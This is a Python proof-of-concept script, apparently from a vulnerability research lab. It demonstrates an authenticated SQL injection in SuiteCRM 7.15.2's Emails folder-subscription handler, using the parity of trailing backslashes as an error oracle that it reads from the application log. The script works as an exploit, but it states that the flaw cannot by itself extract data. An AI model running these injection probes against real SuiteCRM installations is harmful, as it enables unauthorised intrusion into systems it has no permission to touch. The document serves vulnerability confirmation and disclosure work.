#!/usr/bin/env python3
"""
VULN-044 -- `folders` subscription SQL injection via unescaped backslash
(EmailUIAjax::handleSubs) -- deterministic error-based oracle

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/Emails/EmailUIAjax.php:76-79 (handleSubs()):
                 foreach ($viewFolders as $f) {
                     $query = 'SELECT * FROM folders WHERE folders.id LIKE "' . $f
                         . '" OR folders.parent_folder LIKE "' . $f . '"';
                     $result = $db->query($query);   // raw, no $db->quote()
Entry point: index.php?module=Emails&action=EmailUIAjax with
             emailUIAction=setFolderViewSelection, $f = $_REQUEST['ieIdShow'][]
             (EmailUIAjax.php:1136). Reachable by ANY authenticated user
             (personal Emails folder subscription -- no special role).

Why this is an ERROR/BOOLEAN oracle, not a data-exfil UNION/blind read
------------------------------------------------------------------------
securexss() (include/utils.php:2608) rewrites `"` to `&quot;` and never
touches backslash, so a literal `"` is unreachable in $f -- but backslash is
not filtered, and MySQL's default (non-ANSI-quotes) string parser treats
backslash as an escape character inside a double-quoted string. Because $f is
substituted into the SAME query TWICE ("...LIKE \"$f\" OR ...LIKE
\"$f\"" -- identical value, no way to make the two occurrences behave
differently) and no quote character is reachable, the only degree of
freedom left is the COUNT of trailing backslashes in $f:
  - EVEN count (0, 2, 4, ...): each `\\` pair is consumed as one escaped
    literal backslash, so the delimiter quote right after $f is NOT
    escaped -- it closes the string normally. Both LIKE clauses parse as
    ordinary (harmless) string literals. Query succeeds, no log entry.
  - ODD count (1, 3, 5, ...): the trailing (unpaired) backslash escapes
    away the delimiter quote that was supposed to close the string, so
    the string swallows the rest of the query text (` OR
    folders.parent_folder LIKE `, the second $f, ...) until it finally
    hits an unescaped quote or runs off the end of the statement --
    MySQL error 1064, logged to suitecrm.log.
This flips deterministically on ONE extra character controlled entirely
by the attacker -- a genuine boolean-style injection oracle -- but
because no reachable character can make the two identical LIKE clauses
diverge or open a real UNION/subquery context, it cannot (with just this
backslash primitive) be escalated to extract data; see notes.md
"Exfiltration depth" for the full argument. This script proves the
injection primitive itself: parity of trailing backslashes deterministically
and repeatably controls whether the constructed SQL statement is valid.

Because handleSubs() computes its JSON response BEFORE running the
per-folder query (EmailUIAjax.php:70-72 vs the loop at :76), the HTTP
response is byte-identical regardless of whether the injected query
errors -- confirmed live below. The oracle is therefore read from
suitecrm.log (inside the app container), exactly as the static finding's
own "live proof" was captured. The ATTACK is still the two authenticated
HTTP POSTs below; reading the log afterwards is verification, the same
way the stage rules allow reading DB state to confirm a SQLi fired.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user.
2. Sends four setFolderViewSelection POSTs, each with a unique random
   marker embedded in ieIdShow[] followed by a controlled number of
   trailing backslashes: 0 (baseline), 1 (odd), 2 (even), 3 (odd again,
   independent confirmation).
3. Greps suitecrm.log (via the app container) for each marker.
4. Asserts: both odd-count markers appear in a "Query Failed ... MySQL
   error 1064" log line (containing our literal payload), and neither
   the baseline nor the even-count marker appear anywhere in the log.
   That 4-way split occurring exactly on backslash-count parity, for two
   independent odd/even pairs, is the decisive, repeatable proof.
"""
import os
import secrets
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login

VULN_ID = "VULN-044"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"
COMPOSE_DIR = "/opt/cvehunter/targets/SuiteCRM"
LOG_PATH = "/var/www/html/suitecrm.log"

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


def app_grep(pattern):
    """Read-only grep of suitecrm.log inside the app container -- the
    oracle read-back, not the attack (the attack is the HTTP POST)."""
    cmd = [
        "docker", "compose", "-p", COMPOSE_PROJECT, "--project-directory", COMPOSE_DIR,
        "exec", "-T", "app", "grep", "-F", pattern, LOG_PATH,
    ]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return out.stdout.strip()


def send_probe(session, marker, backslashes):
    value = marker + ("\\" * backslashes)
    r = session.post(
        f"{BASE_URL}/index.php",
        data={
            "module": "Emails",
            "action": "EmailUIAjax",
            "emailUIAction": "setFolderViewSelection",
            "ieIdShow[]": value,
        },
        headers={"Referer": f"{BASE_URL}/index.php?module=Emails&action=index"},
        timeout=30,
    )
    return value, r


def main():
    banner(VULN_ID, "folders subscription SQLi via unescaped backslash (deterministic error oracle)")

    log("SETUP", "admin session + fresh non-admin user")
    admin = admin_session()
    user = create_user(admin, rand("Pw") + "!2026x")
    s = web_login(user["user_name"], user["password"])
    log("OK", f"low-priv user {user['user_name']} logged in")

    cases = [
        ("baseline_0bs", 0, False, "BASE"),
        ("odd_1bs", 1, True, "ODD-1"),
        ("even_2bs", 2, False, "EVEN-2"),
        ("odd_3bs", 3, True, "ODD-3"),
    ]

    results = {}
    captured = {}
    log("STEP", "sending 4 setFolderViewSelection POSTs (0, 1, 2, 3 trailing backslashes)")
    for label, n_bs, expect_error, tag in cases:
        marker = f"{tag}{secrets.token_hex(5)}"
        value, r = send_probe(s, marker, n_bs)
        log("INFO", f"[{label}] ieIdShow[]={value!r} -> HTTP {r.status_code}, body[:60]={r.text[:60]!r}")
        results[label] = (marker, value, n_bs, expect_error, r)
        captured[label] = (value, r)

    # small settle delay so the log write is flushed before we grep
    time.sleep(1.0)

    log("STEP", "grepping suitecrm.log for each marker (oracle read-back, not the attack)")
    ok = True
    evidence_lines = []
    for label, (marker, value, n_bs, expect_error, r) in results.items():
        hit = app_grep(marker)
        found_error = bool(hit) and "MySQL error 1064" in hit
        log("INFO", f"[{label}] backslashes={n_bs} expect_error={expect_error} found_error={found_error}")
        if hit:
            log("INFO", f"    log line: {hit.splitlines()[0][:220]}")
            evidence_lines.append(f"[{label}] backslashes={n_bs} marker={marker}\n  {hit}\n")
        else:
            evidence_lines.append(f"[{label}] backslashes={n_bs} marker={marker}\n  (no log entry -- clean parse)\n")
        if found_error != expect_error:
            log("FAIL", f"[{label}] oracle mismatch: expected error={expect_error}, got={found_error}")
            ok = False

    with open(os.path.join(EVIDENCE, "oracle_log_lines.txt"), "w") as f:
        f.write("VULN-044 backslash-parity oracle -- suitecrm.log evidence\n")
        f.write("=" * 60 + "\n\n")
        f.write("\n".join(evidence_lines))
    log("INFO", "oracle evidence written to evidence/oracle_log_lines.txt")

    # Use the ODD-1 case as the canonical request.http / response.txt pair,
    # and additionally record that the HTTP response is identical either way.
    odd_value, odd_resp = captured["odd_1bs"]
    even_value, even_resp = captured["even_2bs"]
    with open(os.path.join(HERE, "request.http"), "w") as f:
        req = odd_resp.request
        f.write("# decisive request: ODD backslash count -> breaks the SQL (see response note + oracle_log_lines.txt)\n")
        f.write(f"{req.method} {req.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in req.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(req.body or "")
        f.write("\n\n# control request: EVEN backslash count -> valid SQL, no error (HTTP response looks identical --\n")
        f.write("# the oracle is NOT in the HTTP response, it's in suitecrm.log; see notes.md)\n")
        req2 = even_resp.request
        f.write(f"{req2.method} {req2.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in req2.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(req2.body or "")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"# ODD-backslash-case HTTP response (status={odd_resp.status_code}) -- identical shape to the EVEN case:\n")
        f.write(f"HTTP/1.1 {odd_resp.status_code} {odd_resp.reason}\n")
        for k, v in odd_resp.headers.items():
            f.write(f"{k}: {v}\n")
        f.write(f"\nbody length: {len(odd_resp.content)} bytes\n")
        f.write(odd_resp.text[:600])
        f.write("\n\n# The HTTP response by itself proves nothing (handleSubs() computes its JSON\n")
        f.write("# response BEFORE running the injected query, EmailUIAjax.php:70-79) -- the\n")
        f.write("# decisive proof is suitecrm.log; see evidence/oracle_log_lines.txt.\n")

    if ok:
        log("PROOF", "backslash-count PARITY deterministically and repeatably (2 independent odd cases, "
                      "1 even case, 1 baseline) controls whether the constructed SQL statement is a syntax "
                      "error -- an attacker-controlled boolean-style oracle proving raw interpolation into "
                      "the query, exactly as EmailUIAjax.php:76-79 has no $db->quote()/quoted() call.")
        log("INFO", "Exfiltration depth: constrained by design (see writeup.md) -- $f is duplicated into "
                    "BOTH LIKE clauses with the identical value and no quote character is reachable "
                    "(securexss rewrites '\"' to &quot;), so this primitive proves injection but does not "
                    "by itself extract data; marking CONFIRMED for the injection primitive per the assigned scope.")
        verdict(VULN_ID, "CONFIRMED",
                f"low-priv user {user['user_name']}: 2/2 odd-backslash payloads -> MySQL error 1064 in "
                f"suitecrm.log, 2/2 even/baseline payloads -> clean parse, 100% reproducible")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", "backslash-parity oracle did not behave deterministically")
        sys.exit(1)


if __name__ == "__main__":
    main()
